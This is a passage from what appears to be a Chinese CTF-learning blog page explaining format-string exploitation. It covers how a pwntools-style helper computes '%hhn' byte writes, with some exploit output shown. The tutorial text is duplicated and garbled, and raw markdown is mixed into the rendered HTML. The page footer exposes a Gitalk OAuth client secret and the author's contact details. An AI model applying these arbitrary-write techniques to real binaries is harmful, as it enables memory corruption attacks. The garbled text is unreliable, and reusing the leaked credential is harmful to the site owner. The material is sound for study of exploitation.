+0xff97f18c
+(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04                                                                                                       (                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             Nmodified b for a big number!
+
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>fmt()函数里的else部分我看了好久都没弄明白，为什么第一次写入0x78，后面还能写入0x56,0x34,0x12。因为写入的值是根据前面成功输出的字符个数来决定的，怎么会越写越小呢？</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">else</span><span class="token punctuation">:</span>
+    result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev
+    fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
+fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>result = 256 + word - prev</strong>，可以看到word - prev = -(0x22)，而0x78-0x22就等于0x56，也就是我们想要写入的第二个值，那么为什么又要加256呢？</p>
+<p><strong>%hhn是具有溢出功能的，前面成功输出的字符个数超过255就会从0重新开始计数(比如260就相当于260-256=4)。所以加256并不影响结果，那这里为什么要加256呢？因为word-prev的值是负数，不能直接使用%[num]c (num为负数)，于是先加256，在后面计算输出字符个数的时候会自动减去256。这时候就相当于写入了0x56，后面的0x34，0x12依次类推。</strong></p>
+<blockquote>
+<p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p>
+<p>上面是CTF-Wiki写的，我个人的理解是用%n写入0x12345678这个数据,%n是把已经成功输出字符的个数写入对应指针指向的整型(int)变量，整型(int)变量占4个字节，但是使用%hhn只会修改1个字节。</p>
+</blockquote>
+<pre><code>                                                                                                                                                                                                                 �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             Nmodified b for a big number!</code></pre><p>[<em>] Switching to interactive mode<br>[</em>] Got EOF while reading in interactive</p>
+<pre><code>
+fmt()函数里的else部分我看了好久都没弄明白，为什么第一次写入0x78，后面还能写入0x56,0x34,0x12。因为写入的值是根据前面成功输出的字符个数来决定的，怎么会越写越小呢？
+
+​```python
+else:
+    result = 256 + word - prev
+    fmtstr = "%" + str(result) + "c"
+fmtstr += "%" + str(index) + "$hhn"  </code></pre><p><strong>result = 256 + word - prev</strong>，可以看到word - prev = -(0x22)，而0x78-0x22就等于0x56，也就是我们想要写入的第二个值，那么为什么又要加256呢？</p>
+<p><strong>%hhn是具有溢出功能的，前面成功输出的字符个数超过255就会从0重新开始计数(比如260就相当于260-256=4)。所以加256并不影响结果，那这里为什么要加256呢？因为word-prev的值是负数，不能直接使用%[num]c (num为负数)，于是先加256，在后面计算输出字符个数的时候会自动减去256。这时候就相当于写入了0x56，后面的0x34，0x12依次类推。</strong></p>
+<blockquote>
+<p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p>
+<p>上面是CTF-Wiki写的，我个人的理解是用%n写入0x12345678这个数据,%n是把已经成功输出字符的个数写入对应指针指向的整型(int)变量，整型(int)变量占4个字节，但是使用%hhn只会修改1个字节。</p>
+</blockquote>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://github.com/littlematch59/littlematch59.github.io" rel="external nofollow noreferrer">Kni9hT</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://github.com/littlematch59/littlematch59.github.io/2020/05/19/gen-zhao-ctf-wiki-xue-pwn-ge-shi-hua-zi-fu-chuan-1/">https://github.com/littlematch59/littlematch59.github.io/2020/05/19/gen-zhao-ctf-wiki-xue-pwn-ge-shi-hua-zi-fu-chuan-1/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://github.com/littlematch59/littlematch59.github.io" target="_blank">Kni9hT</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/format-string/">
+                                    <span class="chip bg-color">format string</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'a0abed830299632b89e7',
+        clientSecret: 'c1d97fd201167e15659e1cf04ccf782455654d45',
+        repo: 'littlematch59.github.io',
+        owner: 'littlematch59',
+        admin: "littlematch59",
+        id: '2020-05-19T00-32-35',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/05/19/gen-zhao-ctf-wiki-xue-pwn-ge-shi-hua-zi-fu-chuan-1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="一步一步学pwn|格式化字符串(1)">
+                        
+                        <span class="card-title">一步一步学pwn|格式化字符串(1)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            格式化字符串漏洞原理介绍首先，对格式化字符串漏洞的原理进行简单介绍。
+格式化字符串函数介绍格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/format-string/">
+                        <span class="chip bg-color">format string</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/04/13/fast-git-clone/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="git clone提速|使用proxychains+代理服务">
+                        
+                        <span class="card-title">git clone提速|使用proxychains+代理服务</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言从 github上git clone资源，由于地域限制原因，大陆会特别慢，一般就在0-10KB/s的样子，用Xdown跑多线程都救不了。小项目都得等好久，大项目常规方式基本下不了。Windows现在可以使用国内的码云进行转接项目。但是对
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/git-clone%E6%8F%90%E9%80%9F/" class="post-category">
+                                    git clone提速
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/kali-linux/">
+                        <span class="chip bg-color">kali linux</span>
+                    </a>
+                    
+                    <a href="/tags/ubuntu16-04/">
+                        <span class="chip bg-color">ubuntu16.04</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="https://github.com/littlematch59/littlematch59.github.io" target="_blank">Kni9hT</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">27.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "3";
+                    var startDate = "5";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/littlematch59/littlematch59.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:w1282626975@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1282626975" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1282626975" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+	
+	<!-- 雪花特效 -->
+    
+	
+	
+    <script type="text/javascript"> var OriginTitile = document.title, st;
+	document.addEventListener("visibilitychange", function () { document.hidden ? 
+	(document.title = "页面关闭倒计时:3...2...", clearTimeout(st)) : (document.title = 
+	"倒计时结束！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) }) 
+	</script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
